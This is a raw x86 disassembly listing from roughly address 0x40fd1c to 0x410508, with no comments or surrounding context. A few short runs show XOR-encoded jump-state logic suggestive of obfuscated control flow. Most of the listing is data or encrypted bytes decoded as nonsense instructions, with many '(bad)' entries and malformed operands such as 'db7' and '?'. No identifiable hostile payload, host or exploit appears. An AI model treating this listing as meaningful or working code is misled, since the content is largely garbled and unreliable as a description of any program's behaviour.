  40fd1c:	or     BYTE PTR [ecx+0x7],dl
  40fd1f:	add    eax,ebx
  40fd21:	cmp    ecx,eax
  40fd23:	jne    0x40fd46
  40fd29:	mov    eax,DWORD PTR [ebp-0x20]
  40fd2c:	inc    edi
  40fd2d:	cmp    edi,eax
  40fd2f:	jb     0x40e458
  40fd35:	jmp    0x40fd56
  40fd3a:	mov    eax,DWORD PTR [ebp-0x4]
  40fd3d:	xor    eax,esi
  40fd3f:	add    eax,ebx
  40fd41:	jmp    0x412238
  40fd46:	mov    eax,DWORD PTR [ebp-0x2c]
  40fd49:	movzx  eax,WORD PTR [eax+edi*2]
  40fd4d:	mov    ecx,DWORD PTR [ebp-0x14]
  40fd50:	mov    eax,DWORD PTR [ecx+eax*4]
  40fd53:	mov    DWORD PTR [ebp+0xc],eax
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp-0x8]
  40fd5c:	xor    eax,0x7510855
  40fd61:	add    eax,ebx
  40fd63:	jmp    0x410157
  40fd68:	xlat   BYTE PTR ds:[ebx]
  40fd69:	and    BYTE PTR [eax+eiz*8+0x73],ch
  40fd6d:	ins    BYTE PTR es:[edi],dx
  40fd6e:	push   ebx
  40fd6f:	aaa    
  40fd70:	pop    edx
  40fd71:	push   ecx
  40fd72:	push   ebx
  40fd73:	sahf   
  40fd74:	imul   esi,DWORD PTR [ecx+0x58],0x70b7d8ba
  40fd7b:	jo     0x40fdc6
  40fd7d:	jge    0x40fdef
  40fd7f:	jo     0x40fd25
  40fd81:	adc    al,0x76
  40fd83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd84:	xchg   DWORD PTR es:[eax-0x21aa783b],esp
  40fd8b:	xor    eax,esi
  40fd8d:	xchg   edx,eax
  40fd8e:	mov    ebx,0x105b2fc6
  40fd93:	lods   eax,DWORD PTR ds:[esi]
  40fd94:	sti    
  40fd95:	popf   
  40fd96:	ins    BYTE PTR es:[edi],dx
  40fd97:	push   esp
  40fd98:	pop    esi
  40fd99:	inc    edi
  40fd9a:	sub    DWORD PTR [eax],edx
  40fd9c:	popf   
  40fd9d:	stc    
  40fd9e:	fisttp DWORD PTR [esi+0xa]
  40fda1:	stos   DWORD PTR es:[edi],eax
  40fda2:	dec    esi
  40fda3:	or     BYTE PTR [ecx-0x57],dl
  40fda6:	add    esi,edi
  40fda8:	fnstcw WORD PTR [esi+0x40fe77bf]
  40fdae:	enter  0xc819,0xc5
  40fdb2:	aad    0x1c
  40fdb4:	shl    DWORD PTR [edx+ebx*8+0x123d1f3f],cl
  40fdbb:	adc    BYTE PTR [ecx+0x4],bh
  40fdbe:	daa    
  40fdbf:	jbe    0x40fd8d
  40fdc1:	and    al,0xaf
  40fdc3:	push   edi
  40fdc4:	dec    esi
  40fdc5:	push   ss
  40fdc6:	pop    ebp
  40fdc7:	cli    
  40fdc8:	inc    ebx
  40fdc9:	enter  0xad28,0xb2
  40fdcd:	dec    ebx
  40fdce:	push   ebp
  40fdcf:	in     eax,0x13
  40fdd1:	jg     0x40fd96
  40fdd3:	dec    ebx
  40fdd4:	mov    esp,0x9c412487
  40fdd9:	retf   0xc9de
  40fddc:	add    al,0x4b
  40fdde:	das    
  40fddf:	or     eax,0xcbe90a65
  40fde4:	dec    ebp
  40fde5:	jmp    DWORD PTR [esi]
  40fde7:	sub    al,0xb3
  40fde9:	sbb    cl,bh
  40fdeb:	nop
  40fdec:	rol    BYTE PTR [esi-0x1a],0xd6
  40fdf0:	clc    
  40fdf1:	popa   
  40fdf2:	adc    BYTE PTR [edi+0x4d315561],al
  40fdf8:	push   0xffffffa6
  40fdfa:	xchg   ecx,eax
  40fdfb:	jno    0x40fe34
  40fdfd:	push   0xffffffbe
  40fdff:	and    edi,DWORD PTR [esi+0x29ad9c05]
  40fe05:	mov    ah,bh
  40fe07:	aaa    
  40fe08:	jbe    0x40fdf0
  40fe0a:	or     edi,DWORD PTR [eax-0x41841708]
  40fe10:	aaa    
  40fe11:	and    bl,0x58
  40fe14:	mov    ecx,0xf4deb9c0
  40fe19:	adc    BYTE PTR [eax+0x4bd153b2],bh
  40fe1f:	add    cl,bh
  40fe21:	dec    esi
  40fe22:	aas    
  40fe23:	add    bl,BYTE PTR [esi]
  40fe25:	es jno 0x40fe65
  40fe28:	loop   0x40fdc0
  40fe2a:	in     eax,0x9b
  40fe2c:	push   ss
  40fe2d:	inc    eax
  40fe2e:	mov    eax,ds:0x440458b5
  40fe33:	outs   dx,DWORD PTR ds:[esi]
  40fe34:	mov    bl,0x67
  40fe36:	addr16 call 0xa78c:0xc2a3f935
  40fe3e:	add    ecx,DWORD PTR [ecx+eax*4+0x27]
  40fe42:	or     DWORD PTR [edi],esi
  40fe44:	jg     0x40fec5
  40fe46:	cmp    al,0xf8
  40fe48:	clc    
  40fe49:	idiv   BYTE PTR [ecx]
  40fe4b:	je     0x40fe73
  40fe4d:	xchg   edx,eax
  40fe4e:	nop
  40fe4f:	repz pop ecx
  40fe51:	and    DWORD PTR [eax-0x5e446bc1],ebp
  40fe57:	aam    0xe
  40fe59:	add    eax,0x31154b3d
  40fe5e:	push   cs
  40fe5f:	loope  0x40fe6f
  40fe61:	scas   eax,DWORD PTR es:[edi]
  40fe62:	and    edx,ebp
  40fe64:	adc    DWORD PTR [ecx-0x4e65fab5],ecx
  40fe6a:	dec    esp
  40fe6b:	inc    edx
  40fe6c:	in     al,dx
  40fe6d:	ror    DWORD PTR [esi+edx*8-0x4aaefe06],cl
  40fe74:	div    DWORD PTR [edi+0x1f]
  40fe77:	sti    
  40fe78:	ins    BYTE PTR es:[edi],dx
  40fe79:	leave  
  40fe7a:	sub    eax,0x903c8c91
  40fe7f:	adc    eax,0xfdfdd2bf
  40fe84:	aaa    
  40fe85:	frstor ds:0x4b6956b4
  40fe8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe8c:	outs   dx,BYTE PTR ds:[esi]
  40fe8d:	dec    edx
  40fe8e:	adc    ebx,DWORD PTR [esi+ebx*4]
  40fe91:	cli    
  40fe92:	lahf   
  40fe93:	popf   
  40fe94:	into   
  40fe95:	mov    ebp,0x26135a85
  40fe9a:	mov    edi,0xb60fba92
  40fe9f:	hlt    
  40fea0:	and    dl,bh
  40fea2:	cs sbb eax,0xb5f7680b
  40fea8:	sub    eax,DWORD PTR gs:[ebp+0x35]
  40feac:	test   DWORD PTR [edi],edx
  40feae:	cmp    eax,0xdacb07ae
  40feb3:	sbb    DWORD PTR [eax],edi
  40feb5:	add    ebp,ecx
  40feb7:	pop    edi
  40feb8:	and    eax,0xc5e4a5cf
  40febd:	and    edi,edx
  40febf:	sub    eax,0x382060fc
  40fec4:	fst    DWORD PTR [eax+0x729ca5f0]
  40feca:	xor    BYTE PTR [edi+ebp*2-0x764bafec],cl
  40fed1:	xor    dl,bl
  40fed3:	mov    DWORD PTR [esi],0x51d265a5
  40fed9:	inc    ebx
  40feda:	in     al,dx
  40fedb:	pop    esi
  40fedc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fedd:	xchg   BYTE PTR [esi-0x31bfff37],dl
  40fee3:	cmp    BYTE PTR [ecx],al
  40fee5:	mov    ds:0xe9816248,eax
  40feea:	push   0x5c
  40feec:	jns    0x40fec7
  40feee:	in     al,0xf3
  40fef0:	mov    ecx,0x9ddcb15b
  40fef5:	rcl    BYTE PTR [esp+edi*8+0x441a1499],1
  40fefc:	inc    ebx
  40fefd:	out    0x5b,al
  40feff:	fist   WORD PTR [ebx+0x66]
  40ff02:	retf   
  40ff03:	out    0x60,eax
  40ff05:	es in  eax,dx
  40ff07:	jmp    0x40feb5
  40ff09:	aad    0xae
  40ff0b:	fsub   DWORD PTR [ebx-0x431d09e2]
  40ff11:	mov    edx,0x76f7124a
  40ff16:	cmp    al,0xb4
  40ff18:	test   DWORD PTR [eax+0x31],0x2cd486a8
  40ff1f:	inc    ebx
  40ff20:	cmp    al,0x4
  40ff22:	sub    ebx,esi
  40ff24:	cmp    esp,ebx
  40ff26:	loope  0x40ff94
  40ff28:	pushf  
  40ff29:	adc    al,0xfe
  40ff2b:	iret   
  40ff2c:	jno    0x40ff19
  40ff2e:	imul   ebx,DWORD PTR [edi],0xffffffd1
  40ff31:	daa    
  40ff32:	push   ss
  40ff33:	fadd   DWORD PTR [ebx]
  40ff35:	cmp    BYTE PTR [ebx+0x1c],dh
  40ff38:	outs   dx,DWORD PTR ds:[esi]
  40ff39:	mov    dl,BYTE PTR [esi+0x5f3bce4f]
  40ff3f:	xor    bl,BYTE PTR [ebp+0x4d]
  40ff42:	loope  0x40ff01
  40ff44:	fisttp WORD PTR [ebp-0x3803d21a]
  40ff4a:	jb     0x40ffa9
  40ff4c:	dec    eax
  40ff4d:	aam    0x3d
  40ff4f:	add    al,BYTE PTR [eax+0x55]
  40ff52:	daa    
  40ff53:	scas   al,BYTE PTR es:[edi]
  40ff54:	or     DWORD PTR [eax+0x339c1711],ebx
  40ff5a:	inc    ebx
  40ff5b:	les    eax,FWORD PTR [ecx-0x1c5f7ebd]
  40ff61:	mov    eax,0xab2b8be0
  40ff66:	jecxz  0x40ff89
  40ff68:	(bad)  
  40ff69:	jmp    0xe966:0x89385e5e
  40ff70:	pusha  
  40ff71:	sbb    ecx,DWORD PTR ds:0x93f0149c
  40ff77:	(bad)  
  40ff78:	cmp    BYTE PTR [edi+0x24],bl
  40ff7b:	mov    bl,0x7d
  40ff7d:	(bad)  
  40ff7e:	push   esi
  40ff7f:	push   edi
  40ff80:	or     al,BYTE PTR [esi+0x1a]
  40ff83:	push   es
  40ff84:	mov    dl,0x19
  40ff86:	cmp    ebp,DWORD PTR [edx+0x53aacd55]
  40ff8c:	dec    esi
  40ff8d:	or     eax,DWORD PTR [edi-0x77]
  40ff90:	pop    eax
  40ff91:	stc    
  40ff92:	les    esp,FWORD PTR cs:[eax-0x42a1d9d]
  40ff99:	xor    eax,edx
  40ff9b:	ss cs push 0x7e
  40ff9f:	test   DWORD PTR [eax],ecx
  40ffa1:	pushf  
  40ffa2:	cmp    BYTE PTR [esi],bl
  40ffa4:	repz add eax,0x2a04da16
  40ffaa:	or     BYTE PTR [edx+0x6334b8d4],al
  40ffb0:	inc    ecx
  40ffb1:	lea    esp,[ebp+0x5a]
  40ffb4:	jl     0x40ff85
  40ffb6:	jg     0x410008
  40ffb8:	jns    0x40ffcf
  40ffba:	pop    ebx
  40ffbb:	mov    cl,0x56
  40ffbd:	pop    ss
  40ffbe:	cmp    DWORD PTR [esi+ecx*4],ebx
  40ffc1:	jp     0x40ffa0
  40ffc3:	(bad)  
  40ffc4:	rcr    BYTE PTR [esp+eiz*8+0x4e695a4d],cl
  40ffcb:	push   esp
  40ffcc:	cdq    
  40ffcd:	outs   dx,DWORD PTR ds:[esi]
  40ffce:	mov    ds:0x359f9b8d,al
  40ffd3:	inc    ebx
  40ffd4:	dec    edx
  40ffd5:	xchg   esp,eax
  40ffd6:	ror    dh,cl
  40ffd8:	rcr    DWORD PTR [ebp-0x3e],1
  40ffdb:	sub    DWORD PTR ds:0xc5f01ec8,edx
  40ffe1:	daa    
  40ffe2:	adc    DWORD PTR [edi+0x22ee7d02],ebx
  40ffe8:	test   BYTE PTR [esi],bh
  40ffea:	in     al,0x84
  40ffec:	lds    ecx,FWORD PTR [eax+esi*2+0x17]
  40fff0:	jne    0x410003
  40fff2:	pop    edi
  40fff3:	loopne 0x410051
  40fff5:	stos   DWORD PTR es:[edi],eax
  40fff6:	test   eax,0xe2e3e3b9
  40fffb:	and    esi,DWORD PTR [edx+0x4b]
  40fffe:	sub    eax,0x6e250f7f
  410003:	add    eax,ebx
  410005:	lods   eax,DWORD PTR ds:[esi]
  410006:	mov    ebx,edx
  410008:	mov    ecx,0x4516d20d
  41000d:	int    0x75
  41000f:	and    eax,0xd426b929
  410014:	and    eax,0xd4b1993c
  410019:	mov    cl,0xe6
  41001b:	stos   DWORD PTR es:[edi],eax
  41001c:	daa    
  41001d:	shl    BYTE PTR [edx+0x65],cl
  410020:	(bad)  
  410021:	pop    ds
  410022:	retf   0x826
  410025:	(bad)
  410028:	mov    ds:0xde2cbbf4,al
  41002d:	lahf   
  41002e:	xor    BYTE PTR [eax+ebx*4],dl
  410031:	fadd   QWORD PTR [ebx]
  410033:	mov    ebx,0xb61d753a
  410038:	cli    
  410039:	ficom  WORD PTR [esi]
  41003b:	fabs   
  41003d:	in     al,dx
  41003e:	in     eax,dx
  41003f:	neg    cl
  410041:	push   ss
  410042:	enter  0x3e61,0x24
  410046:	cmp    bl,dh
  410048:	xchg   ecx,eax
  410049:	mov    ah,0x13
  41004b:	pop    edx
  41004d:	sahf   
  41004e:	paddb  mm3,QWORD PTR [edx]
  410051:	mov    WORD PTR [edi],cs
  410053:	mov    ecx,0x3778a9b1
  410058:	cmp    ebp,esi
  41005a:	jecxz  0x410080
  41005c:	sbb    esp,edi
  41005e:	cdq    
  41005f:	fld    TBYTE PTR [edx-0x451d1eaf]
  410065:	cdq    
  410066:	rdtsc  
  410068:	xchg   edx,eax
  410069:	push   eax
  41006a:	mov    ch,0x79
  41006c:	(bad)  
  41006d:	cmp    dh,BYTE PTR [esp+eax*2+0x5d]
  410071:	daa    
  410072:	cmp    eax,0x30c14d69
  410077:	repnz out 0xd4,eax
  41007a:	outs   dx,BYTE PTR ds:[esi]
  41007b:	pop    ebx
  41007c:	push   edx
  41007d:	sub    DWORD PTR [esp+edi*2-0x77],eax
  410081:	fdiv   QWORD PTR [ecx+0x45]
  410084:	mov    ebp,0xa4afadb9
  410089:	lahf   
  41008a:	dec    edx
  41008b:	enter  0xd9ac,0xff
  41008f:	test   BYTE PTR [edi-0x38],dl
  410092:	pop    es
  410093:	shr    BYTE PTR [esi-0x1d83513c],1
  410099:	scas   eax,DWORD PTR es:[edi]
  41009a:	mov    esp,0xebce49ec
  41009f:	or     DWORD PTR [esi+0x58f918db],edi
  4100a5:	test   BYTE PTR [ebp-0x2bdfe29b],dh
  4100ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100ac:	ficomp WORD PTR [ecx]
  4100ae:	popf   
  4100af:	pop    ebx
  4100b0:	pop    eax
  4100b1:	adc    BYTE PTR [ebx-0x4],ah
  4100b4:	jns    0x4100a1
  4100b6:	ret    
  4100b7:	pop    es
  4100b8:	das    
  4100b9:	sbb    al,0x32
  4100bb:	call   0xeebd9711
  4100c0:	dec    bp
  4100c2:	push   ebx
  4100c3:	add    esi,esi
  4100c5:	dec    ebx
  4100c6:	jmp    0x905adc
  4100cb:	or     esi,DWORD PTR [edx+0x74]
  4100ce:	mov    ds:0x5c6c7c43,al
  4100d3:	fmul   DWORD PTR [ecx]
  4100d5:	lea    ebp,[edx+0xb]
  4100d8:	das    
  4100d9:	fsub   QWORD PTR [ecx]
  4100db:	push   0x6
  4100dd:	jne    0x410155
  4100df:	mov    edi,0x7fe770cd
  4100e4:	mov    eax,0x67de3456
  4100e9:	je     0x410120
  4100eb:	shr    eax,cl
  4100ed:	in     al,0xf6
  4100ef:	sbb    edi,DWORD PTR [ebx+0x12]
  4100f2:	(bad)  
  4100f3:	inc    ah
  4100f5:	ss (bad) 
  4100f7:	(bad)  
  4100f9:	xchg   ebx,eax
  4100fa:	and    eax,0xca352697
  4100ff:	add    bh,ah
  410101:	sub    DWORD PTR [eax],ebx
  410103:	and    DWORD PTR [edi],edi
  410105:	mov    cl,0x59
  410107:	mov    edx,0x5a87e3fb
  41010c:	mov    WORD PTR [ebx-0x43],ss
  41010f:	mov    esi,0x19a348de
  410114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410115:	add    bh,BYTE PTR [ebx-0x62]
  410118:	js     0x410183
  41011a:	jbe    0x4100b0
  41011c:	pusha  
  41011d:	(bad)  
  41011e:	push   esi
  41011f:	test   BYTE PTR [eax-0x39c7b59e],dl
  410125:	ss out dx,al
  410127:	or     BYTE PTR [esi+0x64e8026f],bh
  41012d:	ret    
  41012e:	sub    eax,0x97e0aac3
  410133:	imul   edi,DWORD PTR [ecx],0x5b
  410136:	(bad)  [ebx]
  410138:	dec    ebx
  410139:	stc    
  41013a:	jmp    0x4101b5
  41013c:	dec    ebp
  41013d:	fld    DWORD PTR [esp+ebx*4+0x2bbea269]
  410144:	jg     0x4101bc
  410146:	mov    bh,0x78
  410148:	mov    esi,0xbc425e63
  41014d:	add    eax,0x3c9ddb62
  410152:	enter  0x17f2,0x16
  410156:	mov    ds:0x850fc83b,al
  41015b:	or     eax,0x8b000000
  410160:	inc    ebp
  410161:	cld    
  410162:	xor    eax,0x7510855
  410167:	jmp    0x40fd3f
  41016c:	mov    eax,DWORD PTR [ebp+0xc]
  41016f:	add    eax,DWORD PTR [ebp+0x8]
  410172:	mov    DWORD PTR [ebp-0x10],eax
  410175:	mov    eax,DWORD PTR [ebp-0x1c]
  410178:	jmp    0x41056c
  41017d:	sahf   
  41017e:	das    
  41017f:	or     ah,BYTE PTR [edi]
  410181:	mov    DWORD PTR [ecx],esp
  410183:	mov    cl,0xb5
  410185:	pop    es
  410186:	mov    BYTE PTR [ebx],bl
  410188:	(bad)  
  410189:	dec    ecx
  41018a:	jp     0x4101fd
  41018c:	iret   
  41018d:	xor    DWORD PTR [ebx+0x7d497070],esi
  410193:	jo     0x410205
  410195:	mov    al,ds:0xe545719d
  41019a:	call   0x40bee1ed
  41019f:	add    cl,BYTE PTR [edi+0x11]
  4101a2:	daa    
  4101a3:	les    esi,FWORD PTR [edi-0x36]
  4101a6:	xchg   edi,eax
  4101a7:	or     eax,0x7f15f1c1
  4101ac:	mov    WORD PTR [ebx-0x2573d3d2],es
  4101b2:	sbb    dh,al
  4101b4:	stos   DWORD PTR es:[edi],eax
  4101b5:	or     bl,BYTE PTR [ebp-0x54]
  4101b8:	or     eax,0x78c7996e
  4101bd:	or     eax,0xa54fb8e9
  4101c2:	(bad)  
  4101c3:	mov    ebp,0xfdb1aabc
  4101c8:	out    0x87,eax
  4101ca:	inc    ebp
  4101cb:	mov    ds:0xd379cac9,al
  4101d0:	dec    ebp
  4101d1:	add    eax,0x2ab0b2d9
  4101d6:	(bad)  
  4101d7:	rcl    BYTE PTR [edi],1
  4101d9:	cs ss scas eax,DWORD PTR es:[edi]
  4101dc:	inc    ebp
  4101dd:	xchg   esi,eax
  4101de:	cmp    eax,0xad1cc3b3
  4101e3:	aas    
  4101e4:	lds    ecx,FWORD PTR [edx]
  4101e6:	arpl   ax,bx
  4101e8:	mov    bl,0x1b
  4101ea:	xor    BYTE PTR [ebx],cl
  4101ec:	inc    ebp
  4101ed:	cdq    
  4101ee:	sti    
  4101ef:	inc    eax
  4101f0:	xchg   ecx,eax
  4101f1:	scas   eax,DWORD PTR es:[edi]
  4101f2:	rol    DWORD PTR [esi-0x178990aa],cl
  4101f8:	dec    esp
  4101f9:	stc    
  4101fa:	sub    DWORD PTR [edx-0x626206cf],eax
  410200:	push   es
  410201:	clc    
  410202:	imul   eax,DWORD PTR [eax-0xd],0x50505f37
  410209:	(bad)  
  41020a:	neg    BYTE PTR [edi+0x5]
  41020d:	pop    ecx
  41020e:	xchg   edx,eax
  41020f:	dec    edx
  410210:	adc    DWORD PTR [eax+esi*1+0x2bb2beb5],eax
  410217:	rol    BYTE PTR [edi-0x514dd9a7],1
  41021d:	mov    al,ch
  41021f:	jae    0x41025f
  410221:	push   0x88dc542a
  410226:	jl     0x41021f
  410228:	pushf  
  410229:	sbb    al,0x39
  41022b:	lea    eax,[esi-0x2e]
  41022e:	daa    
  41022f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410230:	cmp    dh,BYTE PTR [ecx+0x27ac2af2]
  410236:	addr16 jge 0x410242
  410239:	jle    0x4101f0
  41023b:	mov    edi,0x95306a36
  410240:	inc    esi
  410241:	retf   0x1ded
  410244:	or     dh,BYTE PTR gs:[edx+0x795e1723]
  41024b:	dec    esi
  41024c:	fsubrp st(2),st
  41024e:	out    0x22,eax
  410250:	mov    eax,0x8f78ec13
  410255:	mov    ecx,0x14f560f7
  41025a:	xor    al,0x61
  41025c:	ret    0xa72b
  41025f:	inc    ebx
  410260:	je     0x4102c3
  410262:	mov    al,ds:0x3af7a22c
  410267:	mov    edx,0xbd32ab66
  41026c:	jg     0x41027f
  41026e:	or     eax,DWORD PTR [esi]
  410270:	dec    edi
  410271:	imul   edx,DWORD PTR [ecx],0x9cefb86d
  410277:	fbld   TBYTE PTR [edi]
  410279:	adc    al,ah
  41027b:	iret   
  41027c:	push   0x582c18dc
  410281:	push   ebx
  410282:	xchg   esi,eax
  410283:	punpcklwd mm1,DWORD PTR [edx+edi*1]
  410287:	ja     0x41027a
  410289:	ins    BYTE PTR es:[edi],dx
  41028a:	iret   
  41028b:	nop
  41028c:	aas    
  41028d:	int    0x25
  41028f:	ret    0x3aaf
  410292:	push   ecx
  410293:	sbb    DWORD PTR [ebx],eax
  410295:	or     bl,bh
  410297:	retf   
  410298:	(bad)  [edi+0x32a04a1e]
  41029e:	sub    al,0x16
  4102a0:	add    bl,al
  4102a2:	les    ecx,FWORD PTR [edx-0x1794a896]
  4102a8:	jle    0x41028a
  4102aa:	imul   esp,DWORD PTR [edi-0x2f0c7cf7],0x4e595d1f
  4102b4:	sub    al,0xb
  4102b6:	push   ecx
  4102b7:	push   ds
  4102b8:	pop    edi
  4102b9:	inc    ebp
  4102ba:	ror    BYTE PTR [ebx],1
  4102bc:	sbb    DWORD PTR ds:0xcac40aa6,edx
  4102c2:	fsubr  DWORD PTR ds:0x15284a42
  4102c8:	iret   
  4102c9:	inc    ecx
  4102ca:	add    dh,BYTE PTR [ecx]
  4102cc:	pop    es
  4102cd:	add    eax,DWORD PTR [esi+0x62]
  4102d0:	jno    0x4102a9
  4102d2:	cwde   
  4102d3:	xchg   eax,edi
  4102d5:	popf   
  4102d6:	je     0xd2b155af
  4102dc:	mov    eax,ds:0xef1bff3d
  4102e1:	dec    edx
  4102e2:	xchg   ebp,eax
  4102e3:	add    eax,0x6e2f2c14
  4102e8:	mov    eax,ds:0x2fdb4f52
  4102ed:	xchg   esi,eax
  4102ee:	add    eax,0xd35cefb7
  4102f3:	mov    ah,0xf8
  4102f5:	push   ds
  4102f6:	ja     0x410358
  4102f8:	mov    ebx,ss
  4102fa:	(bad)  
  4102fb:	div    BYTE PTR [ecx-0x151194d2]
  410301:	xor    al,0x8
  410303:	push   ds
  410304:	xor    ecx,edi
  410306:	xchg   BYTE PTR [edx],dh
  410308:	sahf   
  410309:	pop    ebp
  41030a:	ror    ebp,cl
  41030c:	mov    edi,0x7fb4c81e
  410311:	or     eax,0x9818d046
  410316:	pop    es
  410317:	imul   esp,DWORD PTR [esi+0x3932d73d],0x6a8bf028
  410321:	mov    ebx,db7
  410324:	sbb    ah,BYTE PTR [esi+0xf3e03d7]
  41032a:	xor    eax,0x2b2e7c8f
  41032f:	dec    edi
  410330:	jnp    0x4102d9
  410332:	xor    bl,ah
  410334:	push   ds
  410335:	fild   WORD PTR [eax+esi*4-0x4767c013]
  41033c:	into   
  41033d:	adc    dh,ah
  41033f:	cmc    
  410340:	xchg   esi,eax
  410341:	push   0x8d76bf62
  410346:	and    eax,0x78fb68e3
  41034b:	repnz dec esp
  41034d:	lds    eax,FWORD PTR [ebx]
  41034f:	ror    edx,0x84
  410352:	add    al,0x4a
  410354:	adc    BYTE PTR [ebp+ecx*2+0x1a7a30d2],dl
  41035b:	xchg   ebx,eax
  41035c:	into   
  41035d:	mov    esp,eax
  41035f:	pop    esi
  410360:	xchg   BYTE PTR [edi-0x6a],bh
  410363:	adc    al,0x88
  410365:	push   edx
  410366:	fmul   QWORD PTR [edi-0x4b]
  410369:	(bad)  
  41036a:	mov    ds:0xe7a79dc1,al
  41036f:	clc    
  410370:	fmul   QWORD PTR [ecx+ebx*1-0x48]
  410374:	ds hlt 
  410376:	mov    WORD PTR [edx-0x63],fs
  410379:	mov    esi,?
  41037b:	inc    esp
  41037c:	aad    0xdf
  41037e:	or     DWORD PTR [ebx+0xf750ee6],ebp
  410384:	les    ebx,FWORD PTR [edi+edx*1+0x67]
  410388:	clc    
  410389:	xor    BYTE PTR [edi],bl
  41038b:	leave  
  41038c:	sbb    al,0x60
  41038e:	les    ebp,FWORD PTR [edx+ebx*4+0x5c5caa04]
  410395:	inc    eax
  410396:	scas   eax,DWORD PTR es:[edi]
  410397:	fiadd  DWORD PTR [eax-0x1c376b33]
  41039d:	inc    esp
  41039e:	mov    eax,ds:0xd42495e7
  4103a3:	add    al,0xf5
  4103a5:	jg     0x410331
  4103a7:	psubsb mm6,QWORD PTR [esi]
  4103aa:	sbb    DWORD PTR [ecx+0x77f07c33],ebx
  4103b0:	mov    DWORD PTR [ebx-0x1e6d43a2],edi
  4103b6:	cmp    BYTE PTR [edx],bh
  4103b8:	mov    BYTE PTR [esi],bl
  4103ba:	fsub   QWORD PTR [edx+edx*4-0x74383c91]
  4103c1:	xchg   edi,eax
  4103c2:	jns    0x41035a
  4103c4:	arpl   WORD PTR [ebx+edx*2],cx
  4103c7:	cmp    al,0xac
  4103c9:	cmp    eax,0x16e608ff
  4103ce:	out    0x2c,eax
  4103d0:	sar    DWORD PTR [ebx-0x6b527663],1
  4103d6:	sbb    ebx,DWORD PTR [esi+ecx*1+0x1bfd3770]
  4103dd:	ret    
  4103de:	repnz cmp edi,DWORD PTR [edi+0x78]
  4103e2:	js     0x410368
  4103e4:	ds stos DWORD PTR es:[edi],eax
  4103e6:	cmp    DWORD PTR [eax+0x48c87327],0x6a84d84f
  4103f0:	xor    BYTE PTR [esi],al
  4103f2:	jmp    0x59cdb940
  4103f7:	or     bl,0xaa
  4103fa:	fcomp  QWORD PTR [ebx]
  4103fc:	mov    WORD PTR [ebx+0x1d1b7b30],?
  410402:	sub    esi,DWORD PTR [ebx-0x14]
  410405:	cmp    esp,DWORD PTR [ecx-0x24]
  410408:	xchg   ebx,eax
  410409:	(bad)  [edx]
  41040b:	adc    eax,0x18343eca
  410410:	pop    esp
  410411:	xor    eax,0x8b0c3ac0
  410416:	pop    ebp
  410417:	fild   WORD PTR [ebp+0x41ea08b4]
  41041d:	jo     0x410422
  41041f:	push   ds
  410420:	aas    
  410421:	add    dh,BYTE PTR [edx]
  410423:	loope  0x4103c7
  410425:	(bad)  
  410426:	sbb    al,0x4
  410428:	jmp    0xd1c10e34
  41042d:	pusha  
  41042e:	mov    eax,edi
  410430:	lods   al,BYTE PTR ds:[esi]
  410431:	cmc    
  410432:	aam    0xd6
  410434:	xor    eax,0xbdb344db
  410439:	lods   eax,DWORD PTR ds:[esi]
  41043a:	mov    bh,0x59
  41043c:	add    ebp,DWORD PTR [ebp-0x1f1ea6ef]
  410442:	inc    cx
  410444:	mov    bh,0xfc
  410446:	rcl    DWORD PTR [ecx-0x53ce6f18],cl
  41044c:	loope  0x4103f5
  41044e:	inc    esi
  41044f:	(bad)  
  410451:	jmp    0x4104a3
  410453:	push   edx
  410454:	sub    DWORD PTR [ecx+0x3e],ebp
  410457:	lock aas 
  410459:	jmp    0xad2c1795
  41045e:	inc    edx
  41045f:	xchg   esp,eax
  410460:	fsubrp st(4),st
  410462:	icebp  
  410463:	adc    eax,0x2f24f514
  410468:	inc    esp
  410469:	test   BYTE PTR [esi+0x6420a029],dl
  41046f:	add    BYTE PTR [edx],0x77
  410472:	std    
  410473:	xchg   edx,eax
  410474:	jnp    0x4103ff
  410476:	int    0x2e
  410478:	jno    0x410453
  41047a:	sahf   
  41047b:	popf   
  41047c:	ins    BYTE PTR es:[edi],dx
  41047d:	mov    dl,BYTE PTR [ebx]
  41047f:	(bad)  
  410480:	mov    dh,0x9d
  410482:	ret    
  410483:	loope  0x4104c7
  410485:	les    ecx,FWORD PTR [edx-0xc]
  410488:	jp     0x4104de
  41048a:	inc    edx
  41048b:	cs pop ebp
  41048d:	xchg   ebx,eax
  41048e:	push   ebx
  41048f:	inc    esp
  410490:	pop    edi
  410491:	in     eax,0x3f
  410493:	jp     0x41046e
  410495:	mov    eax,0x95f16821
  41049a:	xchg   edx,eax
  41049b:	das    
  41049c:	aam    0x75
  41049e:	popa   
  41049f:	rol    BYTE PTR [ebp+0x58f1eec7],1
  4104a5:	adc    eax,0x3f111b52
  4104aa:	les    ebx,FWORD PTR [edx]
  4104ac:	mov    edi,0xb99d2b00
  4104b1:	ret    0x846b
  4104b4:	push   ebp
  4104b5:	outs   dx,DWORD PTR ds:[esi]
  4104b6:	scas   al,BYTE PTR es:[edi]
  4104b7:	ss popf 
  4104b9:	sbb    dl,BYTE PTR [esp+esi*2-0x3b1df3c6]
  4104c0:	mov    ebx,0x4d5278ac
  4104c5:	pop    ebp
  4104c6:	leave  
  4104c7:	call   0xb928:0x445a37b8
  4104ce:	clc    
  4104cf:	mov    ah,0xf5
  4104d1:	or     al,0x18
  4104d3:	dec    eax
  4104d4:	jmp    0x4104dc
  4104d6:	adc    DWORD PTR [ebp-0x37],ebp
  4104d9:	aad    0x8d
  4104db:	push   0xa025e2df
  4104e0:	push   0xbdb333c8
  4104e5:	pop    es
  4104e6:	stos   DWORD PTR es:[edi],eax
  4104e7:	fadd   DWORD PTR [eax-0xb]
  4104ea:	push   0x6e
  4104ec:	les    esp,FWORD PTR [ebp-0x1229e461]
  4104f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104f3:	pushf  
  4104f4:	mov    dl,BYTE PTR [eax]
  4104f6:	pop    ss
  4104f7:	neg    DWORD PTR [edx]
  4104f9:	jmp    0x1dea4ab7
  4104fe:	jnp    0x410559
  410500:	jmp    0x86cb226f
  410505:	outs   dx,DWORD PTR ds:[esi]
  410506:	and    al,0x11
  410508:	cmp    BYTE PTR [edx],bh
